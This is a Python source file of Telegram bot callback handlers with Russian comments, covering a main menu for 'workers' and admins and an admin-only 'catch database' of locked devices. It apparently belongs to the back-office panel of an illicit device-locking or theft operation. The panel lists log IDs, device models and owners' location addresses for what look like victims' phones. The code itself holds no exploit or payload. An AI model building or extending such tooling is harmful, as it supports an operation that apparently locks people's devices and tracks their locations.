# bot/handlers/callbacks.py
from aiogram import Router, F
from aiogram.types import CallbackQuery
from aiogram.exceptions import TelegramBadRequest

from bot.keyboards import get_main_keyboard, get_locked_list_keyboard
from config.settings import settings
from utils.logger import logger

router = Router()
router.db = None


def is_admin(user_id: int) -> bool:
    """Проверка, является ли пользователь админом."""
    if not user_id:
        return False
    if not hasattr(settings, 'ADMIN_IDS'):
        return False
    return user_id in settings.ADMIN_IDS


async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup=None):
    """Безопасное редактирование сообщения с fallback."""
    try:
        if callback.message:
            await callback.message.edit_text(text, reply_markup=reply_markup)
        else:
            await callback.answer(text)
    except TelegramBadRequest as e:
        error_str = str(e)
        if "message is not modified" in error_str:
            return
        if "message can't be edited" in error_str:
            try:
                if callback.message:
                    await callback.message.answer(text, reply_markup=reply_markup)
            except Exception:
                pass
            return
        if "message to edit not found" in error_str:
            return
        logger.warning(f"Edit error: {error_str}")
    except Exception as e:
        logger.warning(f"Unexpected edit error: {e}")


async def _ensure_db(callback: CallbackQuery) -> bool:
    """Проверка наличия подключения к БД."""
    if not router.db:
        await callback.answer("❌ Ошибка подключения к базе данных")
        return False
    return True


# ============================================
# ГЛАВНОЕ МЕНЮ
# ============================================

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery):
    """Возврат в главное меню (для воркеров и админов)"""
    try:
        if not callback.from_user:
            await callback.answer("❌ Ошибка идентификации")
            return
        
        if not await _ensure_db(callback):
            return
        
        worker = await router.db.get_worker_by_telegram_id(callback.from_user.id)
        role = worker.get('role', 'worker') if worker and isinstance(worker, dict) else "worker"
        
        await safe_edit_message(
            callback,
            "🤖 Главное меню\n\nВыберите действие:",
            reply_markup=get_main_keyboard(role)
        )
        await callback.answer()
    except Exception as e:
        logger.exception("back_to_main failed")
        await callback.answer("❌ Ошибка")


# ============================================
# БАЗА УЛОВА (навигация)
# ============================================

@router.callback_query(F.data == "back_to_locked")
async def back_to_locked(callback: CallbackQuery):
    """Возврат к списку базы улова (только для админов)"""
    try:
        if not callback.from_user:
            await callback.answer("❌ Ошибка идентификации")
            return
        
        if not is_admin(callback.from_user.id):
            await callback.answer("⛔ Доступ запрещён", show_alert=True)
            return
        
        if not await _ensure_db(callback):
            return
        
        devices = await router.db.get_all_locked_devices()
        
        if not devices:
            await safe_edit_message(callback, "📭 База улова пуста")
            await callback.answer()
            return
        
        text = f"🔒 БАЗА УЛОВА ({len(devices)})\n\n"
        for d in devices[:10]:
            log_id = d.get('log_id', 'N/A')
            model = d.get('device_model', 'Unknown')
            location = d.get('location_address', 'Неизвестно')
            text += f"{log_id}\n📱 {model}\n📍 {location}\n\n"
        
        await safe_edit_message(callback, text, reply_markup=get_locked_list_keyboard())
        await callback.answer()
    except Exception as e:
        logger.exception("back_to_locked failed")
        await safe_edit_message(callback, "❌ Ошибка загрузки")
        await callback.answer()


# ============================================
# АДМИН-ПАНЕЛЬ
# ============================================

@router.callback_query(F.data == "admin_panel")
async def admin_panel(callback: CallbackQuery):
    """Переход в админ-панель"""
    from bot.handlers.admin import cmd_admin
    await cmd_admin(callback.message)
    await callback.answer()

# ============================================
# ОБРАБОТЧИК НЕИЗВЕСТНЫХ CALLBACK
# ============================================

@router.callback_query()
async def handle_unknown_callback(callback: CallbackQuery):
    """Обработчик неизвестных callback-запросов"""
    logger.warning(f"Unknown callback: {callback.data}")
    await callback.answer("❌ Неизвестная команда")
